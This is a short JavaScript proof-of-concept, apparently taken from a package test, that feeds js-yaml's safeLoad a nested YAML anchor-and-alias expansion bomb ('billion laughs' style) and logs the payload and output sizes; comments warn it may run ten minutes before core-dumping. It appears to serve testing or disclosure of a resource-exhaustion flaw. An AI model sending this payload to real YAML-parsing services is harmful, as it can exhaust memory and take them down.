

// Warning: may take 10 min before core-dumping
// skip next 119 lines
// taken from test case of package

var payload=`
? - - &id057
      - &id055
        - &id053
          - &id051
            - &id049
              - &id047
                - &id045
                  - &id043
                    - &id041
                      - &id039
                        - &id037
                          - &id035
                            - &id033
                              - &id031
                                - &id029
                                  - &id027
                                    - &id025
                                      - &id023
                                        - &id021
                                          - &id019
                                            - &id017
                                              - &id015
                                                - &id013
                                                  - &id011
                                                    - &id009
                                                      - &id007
                                                        - &id005
                                                          - &id003
                                                            - &id001 [lol]
                                                            - &id002 [lol]
                                                          - &id004
                                                            - *id001
                                                            - *id002
                                                        - &id006
                                                          - *id003
                                                          - *id004
                                                      - &id008
                                                        - *id005
                                                        - *id006
                                                    - &id010
                                                      - *id007
                                                      - *id008
                                                  - &id012
                                                    - *id009
                                                    - *id010
                                                - &id014
                                                  - *id011
                                                  - *id012
                                              - &id016
                                                - *id013
                                                - *id014
                                            - &id018
                                              - *id015
                                              - *id016
                                          - &id020
                                            - *id017
                                            - *id018
                                        - &id022
                                          - *id019
                                          - *id020
                                      - &id024
                                        - *id021
                                        - *id022
                                    - &id026
                                      - *id023
                                      - *id024
                                  - &id028
                                    - *id025
                                    - *id026
                                - &id030
                                  - *id027
                                  - *id028
                              - &id032
                                - *id029
                                - *id030
                            - &id034
                              - *id031
                              - *id032
                          - &id036
                            - *id033
                            - *id034
                        - &id038
                          - *id035
                          - *id036
                      - &id040
                        - *id037
                        - *id038
                    - &id042
                      - *id039
                      - *id040
                  - &id044
                    - *id041
                    - *id042
                - &id046
                  - *id043
                  - *id044
              - &id048
                - *id045
                - *id046
            - &id050
              - *id047
              - *id048
          - &id052
            - *id049
            - *id050
        - &id054
          - *id051
          - *id052
      - &id056
        - *id053
        - *id054
    - &id058
      - *id055
      - *id056
  - - *id057
    - *id058
: key
`
	
console.log("Payload length: ", payload.length)

var jsyaml = require('./package/index.js')

var o = jsyaml.safeLoad(payload);

console.log("Output length: ", o.length)


